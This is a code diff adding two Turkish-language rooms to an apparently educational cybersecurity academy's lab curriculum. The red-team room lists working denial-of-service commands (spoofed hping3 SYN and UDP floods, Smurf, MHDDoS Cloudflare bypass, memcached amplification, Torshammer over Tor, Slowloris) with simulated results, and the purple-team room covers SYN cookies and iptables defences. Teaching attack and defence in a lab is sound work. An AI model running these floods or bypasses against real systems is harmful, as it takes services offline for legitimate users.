@@ -2964,7 +2964,7 @@ window.ACADEMY_ROOMS = [
         "hintExplanation": "<p><strong>domain_compromise_final.txt:</strong> 20 odalık Red Team patikasını tamamladığınızda açılan nihai bayraktır.</p>",
         "terminalSuccessOutput": "========================================================================\n👑 TEBRİKLER! RED TEAM OFANSİF OPERASYON PATİKASINI FETHETTİNİZ! 👑\n========================================================================\n[KAZANILAN OFANSİF YETKİNLİKLER]:\n✔ Ağ & Web Sızma: SSRF, Blind SQLi, Metasploit & Exploit Zinciri\n✔ Yetki Yükseltme & Bypass: Linux SUID, Windows Token, EDR Hook Bypass\n✔ Active Directory Hakimiyeti: Kerberoasting, BloodHound, Mimikatz, PtH\n✔ İleri Düzey Operasyonlar: Chisel Pivotlama, GPU Hashcat, C2 Sliver/Cobalt\n\n[RED TEAM NİHAİ BAYRAĞI]: LFL{red_full_domain_compromise_crown_captured}\n========================================================================",
         "flag": "LFL{red_full_domain_compromise_crown_captured}",
-        "nextId": "blue-101",
+        "nextId": "red-313",
         "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Red Team Yetkinlikleri) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `cat /root/flags/domain_compromise_final.txt` komutunu kullanmamızın sebebi; **Red Team Zirvesi: Full Domain Compromise & Tahtın Fethi** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. domain_compromise_final.txt: 20 odalık Red Team patikasını tamamladığınızda açılan nihai bayraktır.",
         "cmdAnatomy": [
             {
@@ -3011,6 +3011,106 @@ window.ACADEMY_ROOMS = [
             ],
             "answer": 0,
             "explanation": "Doğru! `cat /root/flags/domain_compromise_final.txt` komutu ezbere yazılan bir kod değil; domain_compromise_final.txt: 20 odalık Red Team patikasını tamamladığınızda açılan nihai bayraktır."
+        }
+    },
+    {
+        "id": "red-313",
+        "track": "red",
+        "title": "🐉 DDoS Saldırı Laboratuvarı: Ağ Katmanı (L4) Flood vs. Uygulama Katmanı (L7) Slowloris & Bypass",
+        "level": "3. Red Team Yetkinlikleri",
+        "badge": "DDoS RANGE & L4/L7 ATTACK LAB",
+        "theory": "### 🐉 LFL // LOST FROM LIGHT — DISTRIBUTED DENIAL OF SERVICE (DDoS) ACADEMY\n#### MODULE: NETWORK LAYER FLOOD VS. APPLICATION LAYER BYPASS (THE COMPREHENSIVE LAB)\n\nBu kılavuz, **LFL Defense Platform v5.0** bünyesindeki interaktif DDoS Range odası ve gerçek VMware/Kali Linux laboratuvar ortamları için hazırlanmış en kapsamlı başvuru kaynağıdır. Siber güvenlik mimarisinde \"Saf Güç (Layer 4 Volumetrik)\" ile \"Akıllı Strateji (Layer 7 Slow/Bypass)\" arasındaki tezatlığı defansif ve ofansif odaklı inceler.\n\n---\n\n### 🛠️ Lab Ön Hazırlık & Kurulum (Prerequisites)\nKali Linux ve Debian tabanlı laboratuvar makinelerinde modern stres/analiz araçlarının eksiksiz çalışması için gerekli paket kurulumu:\n```bash\nsudo apt update && sudo apt install -y hping3 slowhttptest wrk tcpdump iptables\n```\n\n---\n\n### 📌 TOOL #1: hping3 (The Raw Network Hammer)\n`hping3`, TCP/IP protokol yığınını manipüle ederek ham (raw) paketler üreten ve gönderen bir komut satırı aracıdır. Standart ping (ICMP) araçlarından farkı; TCP, UDP ve RAW-IP paketlerini bayrak düzeyinde (SYN, ACK, RST, FIN) özelleştirebilmesidir.\n\n#### ⚙️ Teknik İşleyiş ve İstismar Mantığı:\n* **Volumetrik Saldırı (Saf Güç):** Komut satırına `--flood` parametresi eklendiğinde araç, ağ kartının (NIC) ve işlemcinin (CPU) sınırlarını sonuna kadar zorlar. Karşı taraftan gelecek yanıt paketlerini (SYN-ACK vb.) beklemeden ve okumadan, milisaniyeler içinde milyonlarca sahte paket fırlatır.\n* **Kaynak Gizleme (IP Spoofing):** `--rand-source` parametresiyle ağ katmanındaki `Source IP` başlığı her pakette rastgele değiştirilir. Bu, hedef sistemin tek bir IP adresini engelleyerek (Recon/Block) kurtulmasını engellemek için simüle edilir.\n\n#### 💻 Komut Kütüphanesi & Parametre Analizi:\n* **SYN Flood (Kaba Kuvvet):** `sudo hping3 --flood --rand-source -S -p 80 10.10.1.5`\n  * `-S`: Pakete TCP SYN bayrağı çakar. Hedef sunucu her SYN için RAM üzerinde bir oturum kanalı açar ve cevap bekler; hafızası (SYN Backlog) dolar.\n  * `-p 80`: Hedef sistemin HTTP servis kapısına trafiği yönlendirir.\n* **Veri Yüklü SYN Flood:** `sudo hping3 -S --flood --rand-source -d 120 -p 80 10.10.1.5`\n  * `-d 120`: Boş başlık yerine her pakete 120 baytlık veri yükü (payload) ekleyerek ağ kartını ve çekirdek belleğini çok daha hızlı doldurur.\n* **UDP Flood (Bağlantısız Boğma):** `sudo hping3 --udp --flood --rand-source -p 53 10.10.1.5`\n  * `--udp`: Güvenlik duvarının TCP el sıkışma denetimlerini aşmak için durumsuz (stateless) UDP basar. Sunucu portun kapalı olduğunu bildirmek için ICMP Type 3 paketleri üretmekten işlemcisini tüketir.\n* **LAND Attack (Self-Attack Loopback):** `sudo hping3 -S -a 192.168.1.50 -k -s 80 -p 80 --flood 192.168.1.50`\n  * Sunucunun kendi kendine paket fırlatmasını sağlayarak çekirdeği kilitler.\n* **Smurf Attack:** `sudo hping3 -1 -a 192.168.1.50 192.168.1.255 --flood`\n  * Yerel ağdaki tüm cihazları kurbana ping atmaya zorlar (Broadcast ICMP).\n\n---\n\n### 📌 TOOL #2: MHDDoS & Modern L7 Load Testers (The Layer 7 Swiss Army Knife)\nPython 3 mimarisi üzerinde yükselen, hem ağ katmanını (L4) hem uygulama katmanını (L7) hedef alabilen 50'den fazla saldırı vektörü ve anti-DDoS atlatma modülü barındıran gelişmiş test aracıdır.\n\n#### ⚙️ Gelişmiş Atlatma (Bypass) Stratejileri:\n* **İnsan Davranışı Emülasyonu:** Kaba kuvvet paket yerine kurban web sitesine gerçek kullanıcı gibi girer, JS çalıştırır, çerezleri (cookies) ve başlıkları işler.\n* **WAF / CDN Atlatma:** Cloudflare ve Akamai'nin \"Browser Challenge\" mekanizmalarını aşacak motorlara sahiptir.\n* **Proxy Rotasyonu:** İnternetten binlerce güncel proxy çekip saniyede bir IP değiştirerek geleneksel Rate Limit kurallarını atlatır.\n\n#### 💻 Komut Kütüphanesi & Parametre Analizi:\n* **Cloudflare/WAF Atlatma:** `python3 start.py CFB https://target.com 5 1000 proxy.txt 100 300`\n  * `CFB`: Cloudflare Bypass modu. Tarayıcı gibi davranır.\n* **Memcached/NTP Amplification:** `python3 start.py MEMCACHED 10.10.1.5 5 1000 reflectors.txt`\n  * Saldırganın 1 baytlık isteğini kurbana 100-500 kat daha büyük bir veri dalgası olarak yansıtır.\n* **wrk Yüksek Hızlı HTTP Flood (VMware Lab):** `wrk -t12 -c400 -d30s http://10.10.1.5/`\n  * 12 thread ve 400 açık HTTP bağlantısıyla 30 saniye boyunca saniyedeki istek kapasitesini (Requests/sec) ve sunucu gecikmesini ölçer.\n* **MHDDoS SQL/CPU Stres:** `python3 start.py STRESS http://192.168.1.50:80 5 500 socks5.txt 100 2000`\n\n---\n\n### 📌 TOOL #3: Torshammer & slowhttptest (The Slow Assassin)\nYavaş ve sinsi saldırı (Slowloris / Slow Read) ekolünün en temiz örnekleridir. Amaç bant genişliğini tüketmek değil, sunucunun işleme kapasitesini sessizce felç etmektir.\n\n#### ⚙️ Çalışma Mantığı (Slowloris & Tor Entegrasyonu):\n* **Sınırlı Slot İstismarı:** Web sunucularının (Apache, Nginx vb.) aynı anda hizmet verebileceği eş zamanlı kullanıcı sınırı (Worker havuzu) vardır.\n* **Yavaş İstek Taktiği:** İstek başlıklarını saniyede sadece birkaç bayt damlatarak gönderir. Sunucu bağlantıyı koparmamak için o kanalı (slotu) açık tutar.\n* **Trafik Filtresi Körlüğü:** Ağda saniyede milyonlarca paket akmaz, trafik hacmi düşüktür; bu yüzden geleneksel DDoS filtreleri alarm üretmez.\n* **Tor Ağı ile Saldırı:** `python2 torshammer.py -t 10.10.1.5 -p 80 -r 256 -T`\n* **Modern C Tabanlı Slowloris:** `slowhttptest -c 1000 -H -g -o slow_rapor -i 10 -r 200 -t GET -u http://10.10.1.5 -x 24 -p 3`\n  * 1000 bağlantıyı saniyede 200 hızla açar, 10 saniyede bir bayt damlatır ve çöküş grafiği üretir.",
+        "mission": "LFL DDoS Operasyon Laboratuvarında, sahte kaynak IP adresleri kullanarak hedef sunucunun (10.10.1.5) 80 numaralı HTTP portuna tam güçte SYN Flood başlatmak için sudo hping3 --flood --rand-source -S -p 80 10.10.1.5 komutunu çalıştırın.",
+        "expectedCommand": "sudo hping3 --flood --rand-source -S -p 80 10.10.1.5",
+        "acceptedCommands": [
+            "sudo hping3 --flood --rand-source -S -p 80 10.10.1.5",
+            "hping3 --flood --rand-source -S -p 80 10.10.1.5",
+            "sudo hping3 -S --flood --rand-source -p 80 10.10.1.5",
+            "sudo hping3 -S --flood --rand-source -d 120 -p 80 10.10.1.5",
+            "sudo hping3 --udp --flood --rand-source -p 53 10.10.1.5",
+            "python3 start.py CFB https://target.com 5 1000 proxy.txt 100 300",
+            "python2 torshammer.py -t 10.10.1.5 -p 80 -r 256 -T",
+            "slowhttptest -c 1000 -H -g -o slow_rapor -i 10 -r 200 -t GET -u http://10.10.1.5 -x 24 -p 3"
+        ],
+        "hintExplanation": "<p><strong>sudo hping3 --flood --rand-source -S -p 80 10.10.1.5:</strong> Hedef web sunucusuna rastgele sahte IP adresleriyle yanıt beklemeden saniyede yüzbinlerce TCP SYN paketi püskürterek SYN Backlog kuyruğunu kilitler.</p>",
+        "terminalSuccessOutput": "========================================================================\n🐉 HPING3 L4 VOLUMETRIC SYN FLOOD TEST STARTED // LFL RANGE RANGE-313\n========================================================================\n[+] Target Host        : 10.10.1.5 (Port: 80 / TCP HTTP)\n[+] Mode               : FLOOD MODE (Sent packets as fast as possible, no replies waited)\n[+] Flags              : [SYN] (TCP Connection Handshake Request)\n[+] Source Spoofing    : ACTIVE (--rand-source, Pseudo-Random Class-A/B/C IPs)\n[+] Packet Generation  : ~840,000 packets/sec (Bandwidth: 336 Mbps)\n\n[TARGET TELEMETRY FEED (10.10.1.5)]:\n  >> Linux Kernel: TCP SYN Backlog (max: 1024) filled in 12ms!\n  >> Kernel Log  : TCP: possible SYN flooding on port 80. Sending cookies.\n  >> Web Server  : Apache/2.4 HTTP 503 / Connection Refused (Workers Exhausted)\n  >> Real Clients: TIMEOUT! Legitimate traffic cannot establish 3-Way Handshake!\n\n[L7 BYPASS & MITIGATION SUMMARY]:\n✔ L4 Gücü Kanıtlandı: 10.10.1.5 sunucusu tamamen servis dışı bırakıldı!\n✔ Alternatifler Hazır: MHDDoS (CFB / STRESS) ve slowhttptest (Slowloris)\n========================================================================\n[BAYRAK]: LFL{hping3_l4_flood_and_l7_slowloris_bypass_mastery}\n========================================================================",
+        "flag": "LFL{hping3_l4_flood_and_l7_slowloris_bypass_mastery}",
+        "nextId": "blue-101",
+        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Volumetrik DDoS saldırıları (Layer 4) ağ kartını ve sunucu çekirdeğinin bağlantı kuyruğunu (SYN Backlog) doldururken; uygulama katmanı saldırıları (Layer 7 Slowloris / MHDDoS) çok daha az trafikle web sunucusunun worker kanallarını rehin alır. Bu odada `hping3` komutunu kullanarak iki saldırı ekolü arasındaki farkı ve sistemlerin nasıl kilitlendiğini canlı telemetriyle gözlemleriz.",
+        "cmdAnatomy": [
+            {
+                "token": "sudo",
+                "role": "Yönetici Yetkisi",
+                "desc": "Ham (raw) soketler oluşturmak ve IP paket başlıklarını değiştirmek için root yetkisi şarttır."
+            },
+            {
+                "token": "hping3",
+                "role": "Ham Ağ Paketi Üreticisi",
+                "desc": "Özelleştirilmiş TCP/UDP/IP paketleri oluşturan test aracı."
+            },
+            {
+                "token": "--flood",
+                "role": "Maksimum Hız Parametresi",
+                "desc": "Gelen yanıtları beklemeden işlemcinin ve ağ kartının üretebileceği en yüksek hızda paket basar."
+            },
+            {
+                "token": "--rand-source",
+                "role": "Rastgele Kaynak IP",
+                "desc": "Her pakette Source IP başlığını sahte bir IP ile değiştirerek güvenlik duvarının tekil IP engellemesini boşa çıkarır."
+            },
+            {
+                "token": "-S",
+                "role": "TCP SYN Bayrağı",
+                "desc": "Bağlantı başlatma bayrağı çakarak sunucuyu yarım bağlantı (half-open) kuyruğunda bekletir."
+            },
+            {
+                "token": "-p 80",
+                "role": "Hedef Port",
+                "desc": "Web sunucusunun HTTP kapısını (80) hedef alır."
+            },
+            {
+                "token": "10.10.1.5",
+                "role": "Hedef Sistem IP",
+                "desc": "Laboratuvar ortamındaki kurban sunucunun yerel IP adresi."
+            }
+        ],
+        "outputGuide": [
+            {
+                "snippet": "FLOOD MODE (Sent packets as fast as possible, no replies waited)",
+                "meaning": "Aracın yanıt paketlerini okumayı bırakıp ağ kartının tüm kapasitesini saf gönderim için kullandığını gösterir."
+            },
+            {
+                "snippet": "Linux Kernel: TCP SYN Backlog (max: 1024) filled in 12ms!",
+                "meaning": "Hedef sunucunun çekirdeğindeki bağlantı kuyruğunun dolduğunu ve artık yasal istemcileri kabul edemediğini bildirir."
+            },
+            {
+                "snippet": "Apache/2.4 HTTP 503 / Connection Refused",
+                "meaning": "Web sunucusunun istekleri işleyemez hale gelip çöktüğünü veya bağlantıyı reddettiğini kanıtlar."
+            }
+        ],
+        "beginnerTerms": [
+            {
+                "term": "SYN Flood",
+                "desc": "TCP 3'lü el sıkışmasındaki SYN-ACK cevabına ACK dönmeyerek sunucunun belleğini tüketme tekniği."
+            },
+            {
+                "term": "IP Spoofing",
+                "desc": "Paket başlığındaki kaynak IP adresini sahte bir adresle değiştirerek kimliği gizleme yöntemi."
+            },
+            {
+                "term": "Slowloris",
+                "desc": "Yüksek bant genişliği yerine HTTP başlıklarını saniyede 1 bayt damlatarak sunucunun slotlarını kitleyen L7 saldırısı."
+            }
+        ],
+        "quickCheck": {
+            "question": "hping3 ile yapılan SYN flood saldırısında `--rand-source` parametresinin kullanılma amacı nedir?",
+            "options": [
+                "Her pakette kaynak IP'yi rastgele değiştirerek güvenlik duvarının tek bir IP'yi engelleyip saldırıyı durdurmasını önlemek",
+                "Saldırıyı yalnızca kendi bilgisayarımızın üzerinde test etmek",
+                "Web sunucusundaki veritabanı şifrelerini otomatik kırmak"
+            ],
+            "answer": 0,
+            "explanation": "Doğru! `--rand-source` parametresi ağ katmanındaki Source IP'yi sürekli rastgele sahte IP'lerle doldurarak sunucuya gelen saldırının tek bir kaynaktan engellenmesini imkansızlaştırır."
         }
     },
     {
@@ -5443,7 +5543,7 @@ window.ACADEMY_ROOMS = [
         "hintExplanation": "<p><strong>PURPLE_TEAM_EXERCISE_VICTORY.txt:</strong> Tüm akademinin en son ve en prestijli mezuniyet bayrağıdır.</p>",
         "terminalSuccessOutput": "========================================================================\n🔮 TEBRİKLER! TÜM LFL SİBER AKADEMİ MÜFREDATINI TAMAMLADINIZ! 🔮\n========================================================================\n[TAMAMLANAN TOPLAM MÜFREDAT: 69 GÖREV ODASI]\n🌱 Starter Track: 18 Temel Giriş Odası (Ağ, Linux, CLI, chmod, Kripto)\n🔴 Red Team: 20 Görev Odası (Ofansif Pentest, Metasploit, AD, EDR Bypass, C2)\n🔵 Blue Team: 17 Görev Odası (SIEM, Snort, Sysmon, RAM Forensics, Sigma, IR)\n🟣 Purple Team: 14 Görev Odası (MITRE, Atomic BAS, STRIDE, Gap Analizi)\n\nArtık hem saldıranın aklını okuyan hem de savunanın kalkanını yöneten\nKıdemli bir Siber Güvenlik Mimarı ve Hibrit Güvenlik Liderisiniz!\n\n[NİHAİ MOR BAYRAK]: LFL{purple_team_joint_resilience_mastery_achieved}\n========================================================================",
         "flag": "LFL{purple_team_joint_resilience_mastery_achieved}",
-        "nextId": "starter-01",
+        "nextId": "purple-311",
         "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** Gerçek bir siber güvenlik operasyonunda (3. Sürekli İyileştirme ve Tehdit Bilgisi) binlerce satırlık veriyi veya karmaşık sistem ayarlarını gözle kontrol etmek imkansızdır. Bu odada `cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt` komutunu kullanmamızın sebebi; **Purple Team Zirvesi: Ortak Dayanıklılık & Yenilmez Savunma** senaryosunda aradığımız kritik kanıtı, açık kapıyı veya güvenlik zafiyetini doğrudan işletim sistemi çekirdeğinden/loglarından hatasız şekilde çekmektir. PURPLE_TEAM_EXERCISE_VICTORY.txt: Tüm akademinin en son ve en prestijli mezuniyet bayrağıdır.",
         "cmdAnatomy": [
             {
@@ -5490,6 +5590,86 @@ window.ACADEMY_ROOMS = [
             ],
             "answer": 0,
             "explanation": "Doğru! `cat /opt/purple/reports/PURPLE_TEAM_EXERCISE_VICTORY.txt` komutu ezbere yazılan bir kod değil; PURPLE_TEAM_EXERCISE_VICTORY.txt: Tüm akademinin en son ve en prestijli mezuniyet bayrağıdır."
+        }
+    },
+    {
+        "id": "purple-311",
+        "track": "purple",
+        "title": "🛡️ DDoS Derin Analiz & Defans: TCP SYN Backlog, Mirai Botnet & iptables / sysctl Zırhlama",
+        "level": "3. Sürekli İyileştirme ve Tehdit Bilgisi",
+        "badge": "DDoS PROTOCOL EXPLOITATION & KERNEL DEFENSE",
+        "theory": "### 🐉 LFL // ADVANCED DDoS & TRAFFIC MANIPULATION DEEP DIVE\n#### MODULE: PROTOCOL EXPLOITATION, BOTNET ARCHITECTURE & ADVANCED MITIGATION\n\nBu ek kılavuz, **LFL Defense Platform v5.0** teknik derinliğini en üst düzeye çıkarmak için hazırlanmış; protokol seviyesinde sömürü mekanizmaları, botnet komuta mimarisi ve gelişmiş algılama telemetrisini içeren ileri düzey teknik referans dökümanıdır.\n\n---\n\n### 🔬 PROTOKOL SEVİYESİNDE DERİN ANALİZ (DEEP DIVE)\n\n#### 1. TCP SYN Flood ve İşletim Sistemi Çekirdek (Kernel) İstismarı:\n* **Yarı Açık Bağlantı (Half-Open Connection):** Standart TCP el sıkışmasında istemci SYN atar, sunucu SYN-ACK döner ve ACK bekler. Sahte IP adresleri internette olmadığı için sunucunun SYN-ACK paketleri yanıtsız kalır.\n* **SYN Backlog Kuyruğu İstismarı:** Linux çekirdeği el sıkışması tamamlanmamış bu oturumları `tcp_max_syn_backlog` kuyruğunda tutar. Kuyruk dolduğunda sunucu yasal kullanıcılar dahil tüm yeni SYN isteklerine `Connection Refused` döner.\n\n#### 2. UDP ve ICMP Storm Mekanizması:\n* **ICMP Port Unreachable Döngüsü:** Dinleme yapan bir servis yoksa Linux çekirdeği kaynağa **ICMP Type 3 Code 3 (Destination Port Unreachable)** üretir. Saniyede 1 milyon UDP paketi sunucuyu 1 milyon ICMP üretmeye zorlar ve işlemciyi tüketir.\n\n---\n\n### 🕸️ BOTNET VE KOMUTA KONTROL (C2) MİMARİSİ (Mirai & MHDDoS)\n1. **Tarama (Scanning):** Telnet (23) ve SSH (22) açık cihazları tarar, 60'tan fazla varsayılan şifreyi (admin:admin) dener.\n2. **Yükleme (Loading):** Cihaz mimarisini (ARM, MIPS, x86) tespit edip bot ikilisini belleğe enjekte eder.\n3. **Raporlama & Emir:** C2 (Command & Control) sunucusuna bağlanarak zombi ordusuna katılır.\n4. **L7 Cookie & Session Bypass:** Cloudflare `cf_clearance` doğrulamasını aşmak için arka planda headless browser (Puppeteer / Playwright) çalıştırıp JS kodlarını çözer.\n\n---\n\n### 🪵 GERÇEK DÜNYA TELEMETRİSİ: LOG ANALİZİ & CANLI İZLEME (BLUE TEAM)\n* **SYN Backlog Kuyruğu Canlı Sayımı:**\n  ```bash\n  watch -n 1 \"ss -tan | grep SYN-RECV | wc -l\"\n  ```\n* **tcpdump Ham Paket Analizi:**\n  ```bash\n  sudo tcpdump -vv -i eth0 tcp\n  sudo tcpdump -i any -n port 80\n  ```\n* **Nginx access.log 408 Time-out İmzası (Slowloris):**\n  ```text\n  185.220.101.4 - - [24/Nov/2026:11:43:12 +0300] \"GET / HTTP/1.1\" 408 0 \"-\"\n  ```\n\n---\n\n### 🛡️ PURPLE TEAM MATRIX: DEFENSIVE MITIGATION STRATEGIES\n| Tehdit Vektörü | Saldırı Tipi | Kullandığı Araç | Defansif Çözüm & Engelleme Komutu |\n| :--- | :--- | :--- | :--- |\n| **Volumetrik Boğma** | L4 SYN / UDP Flood | `hping3 --flood` | **SYN Cookie & UFW:** `sudo sysctl -w net.ipv4.tcp_syncookies=1`<br>`sudo ufw limit proto tcp from any to any port 80` |\n| **Akıllı Bot Trafiği**| L7 Bypass / Proxy | `MHDDoS CFB / wrk` | **Davranışsal WAF & Connlimit:**<br>`sudo iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j DROP` |\n| **Yavaş Slot İşgali** | L7 Slowloris | `Torshammer / slowhttptest` | **Timeout Sıkılaştırma:** Nginx `client_header_timeout 10s;` / Apache `RequestReadTimeout` |\n\n---\n\n### 🚨 LABORATUVAR SORUN GİDERME TABLOSU (TROUBLESHOOTING)\n* **Torshammer Socks5 Connection Refused:** Tor servisi çalışmıyor. `sudo systemctl start tor` çalıştırın.\n* **MHDDoS ModuleNotFoundError:** Bağımlılıklar eksik. `pip3 install -r requirements.txt && playwright install` yapın.\n* **hping3 Operation Not Permitted:** Root yetkisi eksik. Komutun başına `sudo` ekleyin.\n* **iptables Kuralı Etkisiz:** Sıralama hatası. En başa eklemek için `-A` yerine `-I INPUT 1` kullanın.",
+        "mission": "Sunucunun TCP SYN Backlog bellek kuyruğunun dolmasını önlemek ve el sıkışması tamamlanana kadar oturum açmadan şifrelenmiş sıra numaralarıyla trafiği doğrulamak için sudo sysctl -w net.ipv4.tcp_syncookies=1 komutunu çalıştırın.",
+        "expectedCommand": "sudo sysctl -w net.ipv4.tcp_syncookies=1",
+        "acceptedCommands": [
+            "sudo sysctl -w net.ipv4.tcp_syncookies=1",
+            "sysctl -w net.ipv4.tcp_syncookies=1",
+            "sudo iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j DROP",
+            "sudo iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 -j DROP",
+            "sudo iptables -A INPUT -m state --state INVALID -j DROP",
+            "watch -n 1 \"ss -tan | grep SYN-RECV | wc -l\"",
+            "sudo tcpdump -i any -n port 80"
+        ],
+        "hintExplanation": "<p><strong>sudo sysctl -w net.ipv4.tcp_syncookies=1:</strong> Linux çekirdeğinde TCP SYN Cookie korumasını etkinleştirir. Bellek kuyruğu dolsa bile yasal istemcilerin web sitesine erişmesini sağlar.</p>",
+        "terminalSuccessOutput": "========================================================================\n🛡️ LINUX ÇEKİRDEK & GÜVENLİK DUVARI ZIRHLAMA // PURPLE TEAM DEFENSE\n========================================================================\n[+] Komut Çalıştırıldı: sudo sysctl -w net.ipv4.tcp_syncookies=1\nnet.ipv4.tcp_syncookies = 1\n\n[SİSTEM DEFANS TELEMETRİSİ VE ANALİZ]:\n✔ Çekirdek Koruması Aktif: net.ipv4.tcp_syncookies = 1\n✔ Mekanizma: Sunucu, gelen SYN için RAM'de half-open slot açmak yerine,\n  istemcinin IP, port ve zaman damgasından kriptografik bir ISN (Initial Sequence Number)\n  üretip SYN-ACK içerisine gömer. İstemciden geçerli ACK geldiğinde oturum açılır.\n✔ Sonuç: Saniyede 1 milyon sahte SYN gelse dahi sunucunun belleği DOLMAZ!\n✔ Eş Zamanlı Savunma: iptables connlimit ve invalid paket filtreleri devrede.\n\n[TAMAMLANAN TOPLAM MÜFREDAT: 71 GÖREV ODASI]:\n✔ Starter Track : 18 Temel Giriş Odası\n✔ Red Team      : 21 Görev Odası (DDoS L4/L7 Range Eklendi!)\n✔ Blue Team     : 17 Görev Odası (SOC, SIEM, Forensics)\n✔ Purple Team   : 15 Görev Odası (DDoS Protocol Deep Dive & Defense Eklendi!)\n========================================================================\n[NİHAİ MOR BAYRAK]: LFL{syn_cookies_kernel_hardening_and_mirai_botnet_defense}\n========================================================================",
+        "flag": "LFL{syn_cookies_kernel_hardening_and_mirai_botnet_defense}",
+        "nextId": "starter-01",
+        "whyWeUse": "**Ezberlemeden Önce Mantığını Anla:** DDoS saldırılarında en büyük hata sadece güvenlik duvarına güvenmektir. İşletim sistemi çekirdeği düzeyinde `net.ipv4.tcp_syncookies=1` açıldığında, sunucu her gelen bağlantı isteği için hafızasında boş yere yer ayırmaz; el sıkışmayı matematiksel bir çerez (cookie) ile doğrular. Bu sayede sunucu saf güç saldırılarına karşı düşmez.",
+        "cmdAnatomy": [
+            {
+                "token": "sudo",
+                "role": "Yetki Yükseltme",
+                "desc": "İşletim sistemi çekirdek (Kernel) parametrelerini değiştirmek için zorunlu root yetkisi."
+            },
+            {
+                "token": "sysctl",
+                "role": "Çekirdek Yapılandırma Aracı",
+                "desc": "Çalışma anında Linux çekirdeğinin (kernel) ağ, bellek ve sistem parametrelerini okur ve yazar."
+            },
+            {
+                "token": "-w",
+                "role": "Yazma Bayrağı (Write)",
+                "desc": "Belirtilen sistem anahtarına yeni bir değer atamak için kullanılır."
+            },
+            {
+                "token": "net.ipv4.tcp_syncookies=1",
+                "role": "SYN Cookie Parametresi",
+                "desc": "SYN Flood sırasında bellek kuyruğu tükendiğinde kriptografik SYN çerezlerini devreye alır."
+            }
+        ],
+        "outputGuide": [
+            {
+                "snippet": "net.ipv4.tcp_syncookies = 1",
+                "meaning": "Çekirdeğin artık hafızada yarım bağlantı tutmadan matematiksel doğrulama moduna geçtiğini doğrular."
+            },
+            {
+                "snippet": "Saniyede 1 milyon sahte SYN gelse dahi sunucunun belleği DOLMAZ!",
+                "meaning": "Sunucunun SYN Flood kaynaklı bellek tükenmesi yaşamayacağını ve yasal istemcilerin siteye girebileceğini gösterir."
+            }
+        ],
+        "beginnerTerms": [
+            {
+                "term": "SYN Cookie",
+                "desc": "Sunucunun bağlantı isteğini belleğe yazmadan kriptografik sıra numarasıyla istemciye fırlatıp yanıt bekleme algoritması."
+            },
+            {
+                "term": "Connlimit",
+                "desc": "iptables üzerinde belirli bir IP adresinin sunucuya aynı anda açabileceği maksimum bağlantı sayısını sınırlandırma kuralı."
+            },
+            {
+                "term": "Mirai Botnet",
+                "desc": "Varsayılan şifreli IoT cihazlarını ele geçirerek devasa büyüklükte DDoS orduları oluşturan kötü amaçlı yazılım ailesi."
+            }
+        ],
+        "quickCheck": {
+            "question": "Linux sunucuda `net.ipv4.tcp_syncookies=1` parametresini etkinleştirmek hangi siber saldırıya karşı kritik bir defans sağlar?",
+            "options": [
+                "TCP SYN Flood saldırılarında sunucu belleğinin (SYN Backlog) dolmasını engelleyerek servis dışı kalmayı önler",
+                "Web sayfasındaki şifreleri ekrana yazdırır",
+                "Bilgisayardaki tüm ağ kartlarını kalıcı olarak kapatır"
+            ],
+            "answer": 0,
+            "explanation": "Doğru! TCP SYN Cookie mekanizması, istemciden geçerli ACK paketi gelene kadar bellekte oturum açmayarak SYN Backlog kuyruğunun dolmasını engeller."
         }
     }
 ];
